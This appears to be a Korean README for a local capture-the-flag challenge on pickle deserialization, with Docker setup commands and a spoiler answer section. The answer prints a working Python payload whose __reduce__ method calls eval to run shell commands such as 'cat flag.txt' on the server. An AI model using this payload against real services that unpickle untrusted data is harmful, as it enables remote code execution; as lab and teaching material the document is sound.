# CTF Project

Dockerfile을 이용해서 이미지를 build하고 run해서 CTF 환경을 구성한다.

```sh
docker build -t pickle_rce_challenge .
docker run -d -p 5000:5000 --name pickle_container pickle_rce_challenge
```

그리고 `http://yourip:5000`에 접속하면 메인페이지를 확인할 수 있다.

메인 페이지에 보면 `/load_profile`로 피클된 데이터를 보내라고 한다.

적절한 값을 보내면 flag를 얻을 수 있다.

<details>
<summary><b>정답</b></summary>

역직렬화 취약점
- 사용자가 /load_profile?data=Base64Encoded 로 전달하면,
- 서버가 그 데이터를 pickle.loads()로 역직렬화 -> 임의 코드 실행 가능

로컬에서 파이썬 파일을 만들어서 피클된 base64 값을 가져온다.
```
import pickle
import base64

class RCE:
    def __reduce__(self):
        import builtins
        # 여기 문자열 안에 원하는 파이썬 코드를 적으면 됨
        # code_str = "__import__('os').popen('ls').read()"
        # ls 명령어를 통해 현재 디렉토리의 파일 목록을 확인할 수 있음
        # 그리고 flag 파일이 있는지 확인하고 cat flag.txt를 통해 플래그를 읽으면 됨
        code_str = "__import__('os').popen('cat flag.txt').read()"
        return (builtins.eval, (code_str,))

payload = pickle.dumps(RCE())
payload_b64 = base64.b64encode(payload).decode()
print(payload_b64)
```

`ls`를 먼저 실행해서 파일과 폴더 목록을 가져온다.

`flag.txt`의 위치를 찾아서 `cat flag.txt`를 실행하여 플래그를 읽을 수 있다.
</details>